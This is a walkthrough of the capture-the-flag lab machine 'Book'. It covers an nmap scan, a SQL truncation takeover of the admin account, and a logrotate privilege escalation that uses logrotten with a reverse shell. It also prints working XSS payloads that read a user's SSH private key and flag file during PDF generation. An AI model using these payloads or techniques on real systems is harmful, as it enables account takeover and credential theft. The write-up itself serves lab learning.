# Book walkthrough

Machine ip: 10.10.10.176

Nmap output:

```
# Nmap 7.80 scan initiated Sun May  3 08:48:45 2020 as: nmap -sS -sV -sC -v -o nmap.txt 10.10.10.176
Increasing send delay for 10.10.10.176 from 0 to 5 due to 179 out of 596 dropped probes since last increase.
Nmap scan report for 10.10.10.176
Host is up (0.044s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  3 08:49:12 2020 -- 1 IP address (1 host up) scanned in 26.56 seconds
```

The only port useful is port 80 so let's start from there. The page is a login form in which you can create an user or login.
After a little bit of enumeration I an find the /admin path where you can only get a login form without registration.

If we make the login ad a normal user we have access to a site where we can read or upload books. Even if it is strange there aren't xss vulnerabilities.
We have to take advantage of a sql truncation vulnerability in the registration form. If we don't put any value the form says the limit number of characters
allowed. Trying to register a new account with the admin email putting more than the acceptable characters we can override the old account.

Now we can login as admin and here we can use an exploit related to xss during the generation of PDF: https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html

Payload used:

```
PAYLOAD:
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText.fontsize(0.5))};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText.fontsize(0.5))};x.open("GET","file:///home/reader/ user.txt");x.send();</script>
```

Now i can get a shell though ssh and grab the user flag.

## Root

Running linenum and pspy we can sport a strange service: logrotate. Online we can find an common exoloit for that service.
We need to download logrotten, compile it and then upload to the machine the file created. I need to edit the file to improve the payload part
in which I've put a reb shell made in php from pentestmonkey.

In order to trigger this service i have to add some content in the backup folder. If the shell is unstable you can just make the script execute the command to grab the flag.

This exploit is available  because the configuration file allows the creation of logs.


https://github.com/whotwagner/logrotten
